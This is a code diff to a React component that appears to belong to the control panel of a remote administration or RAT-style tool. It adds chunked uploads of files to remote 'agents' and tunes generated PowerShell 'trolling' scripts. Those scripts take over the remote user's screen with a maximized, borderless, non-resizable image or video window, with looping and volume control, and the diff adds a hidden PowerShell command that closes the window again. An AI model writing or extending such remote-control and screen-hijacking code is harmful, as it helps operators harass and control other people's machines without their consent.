@@ -1,11 +1,12 @@
-import React, { useState, useRef } from 'react';
+import React, { useEffect, useState, useRef } from 'react';
 import { Button } from './ui/button';
 import { Input } from './ui/input';
 import { Label } from './ui/label';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
 import { Alert, AlertDescription } from './ui/alert';
-import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2 } from 'lucide-react';
+import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2, Square } from 'lucide-react';
 import { useSocket } from './SocketProvider';
+import { Progress } from './ui/progress';
 
 interface UploadedFile {
   id: string;
@@ -14,6 +15,7 @@ interface UploadedFile {
   type: string;
   content: string; // base64
   path?: string;
+  raw?: File;
 }
 
 interface TrollingScript {
@@ -32,10 +34,16 @@ export function BulkUploadManager() {
   const [success, setSuccess] = useState('');
   const [isUploading, setIsUploading] = useState(false);
   const fileInputRef = useRef<HTMLInputElement>(null);
+  const [uploadProgress, setUploadProgress] = useState<Record<string, number>>({});
+  const [uploadMeta, setUploadMeta] = useState<Record<string, { start: number; lastTime: number; received: number; total: number; speed: number; eta: number }>>({});
+  const [trollVolume, setTrollVolume] = useState(100);
+  const [trollLoop, setTrollLoop] = useState(true);
+  const [trollAutoClose, setTrollAutoClose] = useState(0);
 
   const generateImageTrollingScript = (imagePath: string): string => {
     return `Add-Type -AssemblyName PresentationFramework
 $w = New-Object Windows.Window
+$w.Title = 'NCH_TROLLING'
 $w.WindowStyle = 'None'
 $w.WindowState = 'Maximized'
 $w.ResizeMode = 'NoResize'
@@ -54,10 +62,15 @@ $w.Content = $i
 $w.ShowDialog()`;
   };
 
-  const generateVideoTrollingScript = (videoPath: string): string => {
+  const generateVideoTrollingScript = (videoPath: string, opts?: { volume?: number; loop?: boolean; autoClose?: number }): string => {
+    const vol = Math.max(0, Math.min(1, (opts?.volume ?? 1)));
+    const loop = Boolean(opts?.loop);
+    const autoClose = Math.max(0, Math.floor(opts?.autoClose ?? 0));
     return `Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName PresentationCore
 
 $w = New-Object Windows.Window
+$w.Title = 'NCH_TROLLING'
 $w.WindowStyle = 'None'
 $w.WindowState = 'Maximized'
 $w.ResizeMode = 'NoResize'
@@ -67,12 +80,20 @@ $w.Background = 'Black'
 
 $m = New-Object Windows.Controls.MediaElement
 $m.Source = '${videoPath.replace(/\\/g, '\\\\')}'
-$m.LoadedBehavior = 'Play'
+$m.LoadedBehavior = 'Manual'
 $m.UnloadedBehavior = 'Stop'
 $m.Stretch = 'UniformToFill'
-$m.Volume = 1.0
+$m.Volume = ${vol}
 
 $w.Content = $m
+$w.Add_ContentRendered({
+  try { $m.Play() } catch {}
+})
+${loop ? `Register-ObjectEvent -InputObject $m -EventName 'MediaEnded' -Action { $m.Position = [TimeSpan]::Zero; $m.Play() } | Out-Null` : ``}
+${autoClose > 0 ? `$timer = New-Object System.Windows.Threading.DispatcherTimer
+$timer.Interval = [TimeSpan]::FromSeconds(${autoClose})
+$timer.Add_Tick({ try { $timer.Stop(); $w.Close() } catch {} })
+$timer.Start()` : ``}
 $w.ShowDialog()`;
   };
 
@@ -118,7 +139,8 @@ $w.ShowDialog()`;
           size: file.size,
           type: file.type,
           content: base64,
-          path: folderPath || `C:\\Users\\${file.name}`
+          path: folderPath || `C:\\Users\\${file.name}`,
+          raw: file
         });
       } catch (err) {
         setError(`Failed to process ${file.name}: ${err}`);
@@ -142,6 +164,31 @@ $w.ShowDialog()`;
       reader.readAsDataURL(file);
     });
   };
+  
+  const bytesToBase64 = (bytes: Uint8Array): string => {
+    let binary = '';
+    const CHUNK = 0x8000;
+    for (let i = 0; i < bytes.length; i += CHUNK) {
+      binary += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
+    }
+    return btoa(binary);
+  };
+  
+  const formatBytesPerSec = (bps: number) => {
+    if (!isFinite(bps) || bps <= 0) return '0 B/s';
+    const k = 1024;
+    if (bps < k) return `${Math.round(bps)} B/s`;
+    if (bps < k * k) return `${(bps / k).toFixed(1)} KB/s`;
+    if (bps < k * k * k) return `${(bps / (k * k)).toFixed(2)} MB/s`;
+    return `${(bps / (k * k * k)).toFixed(2)} GB/s`;
+  };
+  
+  const formatSeconds = (s: number) => {
+    if (!isFinite(s) || s <= 0) return '—';
+    const m = Math.floor(s / 60);
+    const ss = Math.floor(s % 60);
+    return `${m}:${ss.toString().padStart(2, '0')}`;
+  };
 
   const uploadFile = async (file: UploadedFile) => {
     if (!socket || !selectedAgent) {
@@ -153,16 +200,61 @@ $w.ShowDialog()`;
     setError('');
     
     try {
-      socket.emit('upload_file', {
+      const uploadId = `ul_${Date.now()}_${Math.random().toString(16).slice(2)}`;
+      const destination = file.path || `C:\\Users\\${file.name}`;
+      socket.emit('upload_file_start', {
         agent_id: selectedAgent,
+        upload_id: uploadId,
         filename: file.name,
-        content: file.content,
-        destination_path: file.path || `C:\\Users\\${file.name}`
+        destination,
+        total_size: file.size,
       });
-      
+      const chunkSize = 512 * 1024;
+      if (file.raw) {
+        for (let offset = 0; offset < file.raw.size; offset += chunkSize) {
+          const slice = file.raw.slice(offset, offset + chunkSize);
+          const buffer = await slice.arrayBuffer();
+          const bytes = new Uint8Array(buffer);
+          const chunkB64 = bytesToBase64(bytes);
+          socket.emit('upload_file_chunk', {
+            agent_id: selectedAgent,
+            upload_id: uploadId,
+            chunk: chunkB64,
+            offset,
+          });
+        }
+      } else {
+        const binaryString = atob(file.content);
+        const total = binaryString.length;
+        for (let i = 0; i < total; i += chunkSize) {
+          const slice = binaryString.slice(i, i + chunkSize);
+          const chunkB64 = btoa(slice);
+          socket.emit('upload_file_chunk', {
+            agent_id: selectedAgent,
+            upload_id: uploadId,
+            chunk: chunkB64,
+            offset: i,
+          });
+        }
+      }
+      const completionPromise = new Promise<void>((resolve, reject) => {
+        const handler = (data: any) => {
+          const ok = Boolean(data?.success);
+          const fn = String(data?.filename || '');
+          if (fn === file.name) {
+            socket.off('file_upload_complete', handler);
+            if (ok) resolve();
+            else reject(new Error(data?.error || 'Upload failed'));
+          }
+        };
+        socket.on('file_upload_complete', handler);
+      });
+      socket.emit('upload_file_complete', {
+        agent_id: selectedAgent,
+        upload_id: uploadId,
+      });
+      await completionPromise;
       setSuccess(`File ${file.name} uploaded successfully`);
-      
-      // Remove from list after successful upload
       setFiles(prev => prev.filter(f => f.id !== file.id));
       
     } catch (err) {
@@ -184,16 +276,16 @@ $w.ShowDialog()`;
     if (file.type.startsWith('image/')) {
       script = generateImageTrollingScript(filePath);
     } else if (file.type.startsWith('video/')) {
-      script = generateVideoTrollingScript(filePath);
+      script = generateVideoTrollingScript(filePath, { volume: trollVolume / 100, loop: trollLoop, autoClose: trollAutoClose });
     } else {
       setError('Unsupported file type for trolling');
       return;
     }
 
-    // First upload the file
+    // First upload the file and wait for completion
     try {
       await uploadFile(file);
-      
+      // Start trolling only after upload success
       // Then execute the trolling script
       socket.emit('command', {
         agent_id: selectedAgent,
@@ -207,6 +299,48 @@ $w.ShowDialog()`;
       setError(`Trolling failed: ${err}`);
     }
   };
+  
+  useEffect(() => {
+    const onProgress = (e: Event) => {
+      const detail: any = (e as CustomEvent).detail;
+      if (!detail) return;
+      if (selectedAgent && detail.agent_id && detail.agent_id !== selectedAgent) return;
+      const fn = String(detail.filename || '');
+      const pct = Math.max(0, Math.min(100, Number(detail.progress || 0)));
+      const received = Number(detail.received || 0);
+      const total = Number(detail.total || 0);
+      const now = Date.now() / 1000;
+      setUploadMeta(prev => {
+        const meta = prev[fn] || { start: now, lastTime: now, received, total, speed: 0, eta: 0 };
+        const dt = Math.max(0.001, now - meta.lastTime);
+        const dr = Math.max(0, received - meta.received);
+        const inst = dr / dt;
+        const speed = meta.speed ? (meta.speed * 0.7 + inst * 0.3) : inst;
+        const remaining = Math.max(0, total - received);
+        const eta = speed > 0 ? remaining / speed : 0;
+        return { ...prev, [fn]: { start: meta.start, lastTime: now, received, total, speed, eta } };
+      });
+      setUploadProgress(prev => ({ ...prev, [fn]: pct }));
+    };
+    const onComplete = (e: Event) => {
+      const detail: any = (e as CustomEvent).detail;
+      if (!detail) return;
+      if (selectedAgent && detail.agent_id && detail.agent_id !== selectedAgent) return;
+      const fn = String(detail.filename || '');
+      setUploadProgress(prev => ({ ...prev, [fn]: 100 }));
+      setUploadMeta(prev => {
+        const meta = prev[fn];
+        if (!meta) return prev;
+        return { ...prev, [fn]: { ...meta, received: meta.total, speed: meta.speed, eta: 0 } };
+      });
+    };
+    window.addEventListener('file_upload_progress', onProgress as EventListener);
+    window.addEventListener('file_upload_complete', onComplete as EventListener);
+    return () => {
+      window.removeEventListener('file_upload_progress', onProgress as EventListener);
+      window.removeEventListener('file_upload_complete', onComplete as EventListener);
+    };
+  }, [selectedAgent]);
 
   const uploadAllFiles = async () => {
     if (files.length === 0) {
@@ -294,6 +428,41 @@ $w.ShowDialog()`;
               </Button>
             </div>
           </div>
+          
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div className="space-y-2">
+              <Label>Volume</Label>
+              <Input
+                type="range"
+                min={0}
+                max={100}
+                step={1}
+                value={trollVolume}
+                onChange={(e) => setTrollVolume(Number(e.target.value))}
+              />
+              <div className="text-xs text-muted-foreground">{trollVolume}%</div>
+            </div>
+            <div className="space-y-2">
+              <Label>Loop Video</Label>
+              <div className="flex items-center gap-2">
+                <Button variant={trollLoop ? 'default' : 'outline'} size="sm" onClick={() => setTrollLoop(!trollLoop)}>
+                  {trollLoop ? 'On' : 'Off'}
+                </Button>
+              </div>
+              <div className="text-xs text-muted-foreground">Restart when finished</div>
+            </div>
+            <div className="space-y-2">
+              <Label>Auto-Close (seconds)</Label>
+              <Input
+                type="number"
+                min={0}
+                step={1}
+                value={trollAutoClose}
+                onChange={(e) => setTrollAutoClose(Math.max(0, Number(e.target.value)))}
+              />
+              <div className="text-xs text-muted-foreground">{trollAutoClose > 0 ? `Closes after ${trollAutoClose}s` : 'No auto-close'}</div>
+            </div>
+          </div>
 
           <div
             className={`border-2 border-dashed rounded-lg p-8 text-center cursor-pointer transition-colors ${
@@ -348,6 +517,16 @@ $w.ShowDialog()`;
                     <div className="flex-1 min-w-0">
                       <p className="text-sm font-medium truncate">{file.name}</p>
                       <p className="text-xs text-muted-foreground">{formatFileSize(file.size)}</p>
+                      <div className="mt-2">
+                        <Progress value={uploadProgress[file.name] || 0} />
+                        <div className="text-[10px] text-muted-foreground mt-1 flex items-center gap-2">
+                          <span>{Math.round(uploadProgress[file.name] || 0)}%</span>
+                          <span>•</span>
+                          <span>{formatBytesPerSec(uploadMeta[file.name]?.speed || 0)}</span>
+                          <span>•</span>
+                          <span>ETA {formatSeconds(uploadMeta[file.name]?.eta || 0)}</span>
+                        </div>
+                      </div>
                     </div>
                     <div className="flex gap-1">
                       <Button
@@ -358,6 +537,33 @@ $w.ShowDialog()`;
                         title="Start trolling with this file"
                       >
                         <Play className="h-3 w-3" />
+                      </Button>
+                      <Button
+                        onClick={() => {
+                          if (!socket || !selectedAgent) return;
+                          const stopScript = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public static class Win {
+  [DllImport("user32.dll", CharSet=CharSet.Unicode)]
+  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+  [DllImport("user32.dll")]
+  public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
+}
+"@
+$h = [Win]::FindWindow($null, "NCH_TROLLING")
+if ($h -ne [IntPtr]::Zero) { [Win]::PostMessage($h, 0x10, [IntPtr]::Zero, [IntPtr]::Zero) }
+`;
+                          const cmd = `powershell -WindowStyle Hidden -Command "${stopScript.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`;
+                          socket.emit('command', { agent_id: selectedAgent, command: cmd, execution_id: `stop-trolling-${Date.now()}` });
+                        }}
+                        disabled={isUploading}
+                        size="sm"
+                        variant="outline"
+                        title="Stop trolling (close window)"
+                      >
+                        <Square className="h-3 w-3" />
                       </Button>
                       <Button
                         onClick={() => uploadFile(file)}
